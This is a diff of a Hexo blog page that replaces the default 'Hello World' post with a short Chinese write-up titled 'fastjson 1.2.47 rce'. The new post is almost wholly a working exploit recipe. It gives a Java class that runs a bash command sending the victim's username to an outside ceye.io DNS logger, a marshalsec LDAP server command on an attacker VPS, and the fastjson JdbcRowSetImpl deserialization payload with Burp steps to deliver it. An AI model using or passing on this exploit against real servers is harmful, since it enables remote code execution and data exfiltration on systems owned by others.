@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hello World | Hexo</title>
+  <title>fastjson 1.2.47 rce | Hexo</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Hello World | Hexo">
+  <meta name="description" content="fastjson 1.2.47 rce | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -305,9 +305,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-fastjson-1-2-47-rce" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Hello World</h1>
+        <h1 class="article-title">fastjson 1.2.47 rce</h1>
     
     <div class="article-meta">
         
@@ -317,7 +317,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-23 08:34:16'>2019-12-23 08:34</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-23 08:16:52'>2019-12-22 19:42</time>
         
     </div>
     <div class="article-meta">
@@ -339,7 +339,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -355,19 +355,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <p>#环境<br>centos：tomcat9 jdk 1.8 fastjson1.2.44<br>vps：tomcat9 jdk1.8_112<br>工具：marshalsec<br>LDAPTouchFile.java  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class LDAPTouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;ping -c 5 &#96;whoami&#96;.xxx.ceye.io&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>#vps上执行监听<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://vps-ip/#LDAPTouchFile" target="_blank" rel="noopener">http://vps-ip/#LDAPTouchFile</a> </p>
+<p>#测试<br>{“name”:”hello”, “age”:20}</p>
+<p>#payload<br>{“name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://vps-ip:1389/LDAPTouchFile”,”autoCommit”:”true”}}</p>
+<p>#burpsuite抓包发送<br>将GET改为POST<br>添加Content-Type:application/json<br>添加payload<br>{“name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://vps-ip:1389/LDAPTouchFile”,”autoCommit”:”true”}}<br><img src="/images/fastjson-2.png" alt=""></p>
+<p>#结果<br><img src="/images/fastjson-1.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
@@ -381,12 +376,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Hello World</p>
+    <p><span class="copy-title">文章标题:</span>fastjson 1.2.47 rce</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="John Doe">John Doe</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-23, 08:34:16</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-23, 08:34:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/23/hello-world/" title="Hello World">http://yoursite.com/2019/12/23/hello-world/</a>
+    <p><span class="copy-title">发布时间:</span>2019-12-22, 19:42:50</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-23, 08:16:52</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/22/fastjson-1-2-47-rce/" title="fastjson 1.2.47 rce">http://yoursite.com/2019/12/22/fastjson-1-2-47-rce/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
